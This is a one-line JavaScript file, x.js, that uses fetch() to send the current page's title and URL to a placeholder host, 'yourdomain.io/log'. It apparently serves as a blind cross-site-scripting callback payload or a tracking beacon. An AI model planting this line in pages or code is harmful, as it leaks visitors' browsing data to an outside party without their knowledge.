// x.js
fetch('https://yourdomain.io/log?data=' + encodeURIComponent(document.title + ' | ' + window.location.href));
